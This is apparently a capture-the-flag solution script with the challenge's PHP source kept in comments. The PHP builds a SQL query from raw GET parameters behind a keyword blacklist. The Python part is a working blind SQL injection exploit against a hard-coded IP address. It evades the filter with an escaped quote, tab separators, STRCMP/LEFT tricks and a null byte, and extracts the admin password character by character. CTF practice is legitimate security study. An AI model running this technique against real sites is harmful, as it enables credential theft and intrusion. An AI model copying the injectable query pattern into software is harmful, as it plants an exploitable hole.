# https://ctftime.org/writeup/11953
# https://graneed.hatenablog.com/entry/2018/10/26/232304

# query : select user from chal where user='' and pw=''
# <?php 
# include "./config.php";
# include "./flag.php";
# error_reporting(0);

# $black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";
# $black_list .= "=|_| |in|<|>|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
# if(preg_match($black_list, $_GET['user'])) exit(":P"); 
# if(preg_match($black_list, $_GET['pw'])) exit(":P"); 


# $query="select user from chal where user='$_GET[user]' and pw='$_GET[pw]'"; 

# $result = mysql_query($query);
# $result = mysql_fetch_array($result);
# $admin_pass = mysql_fetch_array(mysql_query("select pw from chal where user='admin'"));
# echo "<h1>query : <strong><b>{$query}</b></strong><br></h1>";
# if($result['user']) echo "<h2>Welcome {$result['user']}</h2>"; 
# if(($admin_pass['pw'])&&($admin_pass['pw'] === $_GET['pw'])){
#     echo $flag;
# }

# highlight_file(__FILE__); 

# ?>


import requests
import string
URL = 'http://35.200.215.237/'
LETTERS = string.digits+string.ascii_letters+"!#$&()*+,-./:;<=>?@[\]^_`{|}~"
password = ''
while True:
    flag = False
    for e in LETTERS:
        r = requests.get(
            URL,
            params={
                "pw"  :'||(STRCMP("admi"\t"n",user)\tis\tnot\tTRUE\t&&\tSTRCMP("{}",LEFT(pw,{}))\tis\tnot\tTRUE);\x00'.format(password+e,len(password+e)),
                "user":"a\\"
                }
            )
        if "Welcome admin" in r.text:
            password += e
            print(password)
            flag = True
            break
    if flag: continue
    exit()
